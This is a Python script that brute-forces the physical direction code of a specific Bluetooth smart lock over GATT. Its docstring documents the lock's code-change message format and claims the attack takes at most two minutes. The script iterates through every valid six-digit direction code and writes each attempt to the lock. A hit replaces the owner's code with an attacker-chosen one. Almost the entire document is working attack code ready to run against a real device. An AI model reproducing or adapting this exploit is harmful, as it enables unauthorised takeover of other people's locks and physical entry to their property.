'''
This script attempts to change the physcial code for the lock.
The change physcial code message looks like this:

0xff 0xXX 0xXX 0xXX 0xXX 0xXX 0xXX 0xYY 0xYY 0xYY 0xYY 0xYY 0xYY 0xfe

The "0xXX" place holders represents the original physical code.
The "0xYY" place holders represents the new physical code.

The physical code is made of 4 directions (up, down, left, right) and is represented by numbers.

1 = up
2 = down
3 = left
4 = right

For example, if the physical code was originally "up down left right up down" and we want to change it to "left right left right left right", the message would look like:

0xff 0x01 0x02 0x03 0x04 0x01 0x02 0x03 0x04 0x03 0x04 0x03 0x04 0xfe

This script attempts to brute force the physical passcode in order to change it. What makes this the optimal way to brute foce the lock is that a digit cannot be 0 and cannot go beyond 4.

For example, brute forcing the first few physical codes would look like this:

111111
111112
111113
111114
111121
111122
111123
111124

Based on actual testing, brute forcing the lock via this method should take at most 2 minutes.

If the original physcial code is found, then the lock will respond with the message "0x60 0xf0 0x00 0x95". You can then try to open the lock with the new physical code "left right left right left right".
'''

import pygatt
from binascii import hexlify
import sys
import math
from concurrent import futures
import random
import time

print(time.time())

adapter = pygatt.backends.GATTToolBackend()

def change_physical_method(i):
    # ff xx xx xx xx xx xx yy yy yy yy yy yy fe
    physical_code = bytearray([0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x04, 0x03, 0x04, 0x03, 0x04, 0xfe]) # changed to "changed physical code"
    if len(str(i)) < 6:
        padding = "0" * (6 - (int(len(str(i)))))
        padding += str(i)
    else :
        padding = str(i)
    code = padding[:0] + '0' + padding[0:1] + '0' + padding[1:2] + '0' + padding[2:3] + '0' + padding[3:4] + '0' + padding[4:5] + '0' + padding[5:6]
    temp_code = bytearray.fromhex(code)
    i2 = 0
    while i2 != 6:
        if temp_code[i2] == 0:
            return
        if temp_code[i2] > 4:
            return
        physical_code[i2+1] = temp_code[i2]
        i2 = i2 + 1
    device.char_write("0000ffd9-0000-1000-8000-00805f9b34fb", physical_code, wait_for_response=False)
    print(padding + " " + code)

def handle_data(handle, value):
    response = hexlify(value)
    # 60 f0 00 95
    if "60f00095" in str(response):
        print("Received repsonse (%s)" % str(response))
        #sys.exit()

adapter.start()
print("Connecting...")
#
#
#
#
# change the MAC address to whatever the address is for your lock
device = adapter.connect('28:EC:9A:09:EC:EF')
#
#
#
#
#

device.subscribe("0000ffd4-0000-1000-8000-00805f9b34fb",callback=handle_data, wait_for_response=True)
device.subscribe("0000ffdf-0000-1000-8000-00805f9b34fb", indication=False, wait_for_response=True)

print('Starting...')

payload = 1
while payload != 444445:
    change_physical_method(payload)
    payload = payload + 1
    
print("finished")

adapter.stop()

print(time.time())
